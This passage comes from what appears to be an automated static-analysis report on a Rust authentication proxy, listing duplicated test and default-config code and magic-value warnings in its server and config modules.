            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1716

**Code:**
```
    fn test_oauth_callback_params_deserialization() {
        // Test with all params
        let json = r#"{"code":"abc123","state":"xyz789","error":null,"error_description":null}"#;
        let params: OAuthCallbackParams = serde_json::from_str(json).unwrap();
        assert_eq!(params.code, Some("abc123".to_string()));
        assert_eq!(params.state, Some("xyz789".to_string()));
        assert!(params.error.is_none());
        
        // Test with error
        let json = r#"{"error":"access_denied","error_description":"User denied access"}"#;
        let params: OAuthCallbackParams = serde_json::from_str(json).unwrap();
        assert_eq!(params.error, Some("access_denied".to_string()));
        assert_eq!(params.error_description, Some("User denied access".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1583

**Code:**
```
    fn test_header_injector() {
        use opentelemetry::propagation::Injector;
        
        let mut headers = HeaderMap::new();
        {
            let mut injector = HeaderInjector(&mut headers);
            injector.set("x-trace-id", "12345".to_string());
        }
        
        assert_eq!(headers.get("x-trace-id").unwrap(), "12345");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Magic value '"healthy"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 149

---

#### Magic value '"alive"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 158

---

#### Magic value '"unknown"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 216

---

#### Magic value '"unknown"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 320

---

#### Magic value '60' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 473

---

#### Magic value '"client_secret"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 634

---

#### Magic value '"Accept"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 639

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 639

---

#### Magic value '"access_token"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 669

---

#### Magic value '"token_type"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 675

---

#### Magic value '"Bearer"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 677

---

#### Magic value '"expires_in"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 681

---

#### Magic value '"refresh_token"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 685

---

#### Magic value '"scope"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 690

---

#### Magic value '"mtls"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 729

---

#### Magic value '"mtls"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 748

---

#### Magic value '"Authorization"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 760

---

#### Magic value '"trace_id"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 886

---

#### Magic value '"nosniff"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 920

---

#### Magic value '"DENY"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 926

---

#### Magic value '"traceparent"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1563

---

#### Magic value '"value"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1573

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1574

---

#### Magic value '"boom"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1613

---

#### Magic value '"traceparent"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1630

---

#### Magic value '60' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1683

---

#### Magic value '30' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1740

---

#### Magic value '45' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1765

---

#### Magic value '127' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1909

---

#### Magic value '1234' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1909

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 91

**Code:**
```
    fn default() -> Self {
        Self {
            host: default_host(),
            port: default_port(),
            max_request_size: default_max_request_size(),
            cors: CorsConfig::default(),
            tls: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 91

**Code:**
```
    fn default() -> Self {
        Self {
            host: default_host(),
            port: default_port(),
            max_request_size: default_max_request_size(),
            cors: CorsConfig::default(),
            tls: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 140

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: false,
            allowed_origins: vec![],
            allowed_methods: default_cors_methods(),
            allowed_headers: default_cors_headers(),
            max_age: default_cors_max_age(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 460

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: true,
            requests_per_second: default_rps(),
            burst_size: default_burst(),
            tool_limits: Vec::new(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 460

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: true,
            requests_per_second: default_rps(),
            burst_size: default_burst(),
            tool_limits: Vec::new(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 590

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: true,
            file: None,
            // SECURITY: Default to false to prevent accidental PII exposure in logs.
            // Users should explicitly configure their log destination.
            stdout: false,
            export_url: None,
            export_batch_size: default_export_batch_size(),
            export_interval_secs: default_export_interval_secs(),
            export_headers: HashMap::new(),
            redaction_rules: Vec::new(),
            rotation: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1043

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = create_valid_config();
        config.upstream.transport = TransportType::Stdio;
        config.upstream.command = None;
        config.upstream.url = None;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1043

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = create_valid_config();
        config.upstream.transport = TransportType::Stdio;
        config.upstream.command = None;
        config.upstream.url = None;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1052

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let mut config = create_valid_config();
        config.upstream.transport = TransportType::Http;
        config.upstream.url = None;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1087

**Code:**
```
    fn test_config_validation_oauth_invalid_redirect_uri() {
        let mut config = create_valid_config();
        config.auth.oauth = Some(OAuthConfig {
            provider: OAuthProvider::GitHub,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None,
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "invalid-uri".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1087

**Code:**
```
    fn test_config_validation_oauth_invalid_redirect_uri() {
        let mut config = create_valid_config();
        config.auth.oauth = Some(OAuthConfig {
            provider: OAuthProvider::GitHub,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None,
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "invalid-uri".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1114

**Code:**
```
    fn test_config_validation_audit_batch_size_zero() {
        let mut config = create_valid_config();
        config.audit.export_url = Some("http://siem.example.com".to_string());
        config.audit.export_batch_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1114

**Code:**
```
    fn test_config_validation_audit_batch_size_zero() {
        let mut config = create_valid_config();
        config.audit.export_url = Some("http://siem.example.com".to_string());
        config.audit.export_batch_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1122

**Code:**
```
    fn test_config_validation_audit_batch_size_too_large() {
        let mut config = create_valid_config();
        config.audit.export_url = Some("http://siem.example.com".to_string());
        config.audit.export_batch_size = 10001;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1222

**Code:**
```
    fn test_transport_type_serialization() {
        let json = serde_json::to_string(&TransportType::Stdio).unwrap();
        assert!(json.contains("stdio"));

        let json = serde_json::to_string(&TransportType::Http).unwrap();
        assert!(json.contains("http"));

        let json = serde_json::to_string(&TransportType::Sse).unwrap();
        assert!(json.contains("sse"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 91

**Code:**
```
    fn default() -> Self {
        Self {
            host: default_host(),
            port: default_port(),
            max_request_size: default_max_request_size(),
            cors: CorsConfig::default(),
            tls: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 590

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: true,
            file: None,
            // SECURITY: Default to false to prevent accidental PII exposure in logs.
            // Users should explicitly configure their log destination.
            stdout: false,
            export_url: None,
            export_batch_size: default_export_batch_size(),
            export_interval_secs: default_export_interval_secs(),
            export_headers: HashMap::new(),
            redaction_rules: Vec::new(),
            rotation: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1188

**Code:**
```
    fn test_config_is_multi_server() {
        let mut config = create_valid_config();
        assert!(!config.is_multi_server());

        config.upstream.servers.push(ServerRouteConfig {
            name: "test".to_string(),
            path_prefix: "/test".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("http://localhost:8080".to_string()),
            strip_prefix: false,
        });
        assert!(config.is_multi_server());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.6% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1188

**Code:**
```
    fn test_config_is_multi_server() {
        let mut config = create_valid_config();
        assert!(!config.is_multi_server());

        config.upstream.servers.push(ServerRouteConfig {
            name: "test".to_string(),
            path_prefix: "/test".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("http://localhost:8080".to_string()),
            strip_prefix: false,
        });
        assert!(config.is_multi_server());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 91

**Code:**
```
    fn default() -> Self {
        Self {
            host: default_host(),
            port: default_port(),
            max_request_size: default_max_request_size(),
            cors: CorsConfig::default(),
            tls: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 200

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: false,
            identity_source: default_mtls_identity_source(),
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1209

**Code:**
```
    fn test_config_error_display() {
        let err = ConfigError::Parse("invalid TOML".to_string());
        assert!(format!("{}", err).contains("invalid TOML"));

        let err = ConfigError::Validation("port must be > 0".to_string());
        assert!(format!("{}", err).contains("port must be > 0"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1068

**Code:**
```
    fn test_config_validation_jwt_invalid_jwks_url() {
        let mut config = create_valid_config();
        config.auth.jwt = Some(JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "invalid-url".to_string(),
                algorithms: default_jwks_algorithms(),
                cache_duration_secs: 3600,
            },
            issuer: "https://issuer.example.com".to_string(),
            audience: "mcp-guard".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1087

**Code:**
```
    fn test_config_validation_oauth_invalid_redirect_uri() {
        let mut config = create_valid_config();
        config.auth.oauth = Some(OAuthConfig {
            provider: OAuthProvider::GitHub,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None,
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "invalid-uri".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 200

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: false,
            identity_source: default_mtls_identity_source(),
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 140

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: false,
            allowed_origins: vec![],
            allowed_methods: default_cors_methods(),
            allowed_headers: default_cors_headers(),
            max_age: default_cors_max_age(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.0% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
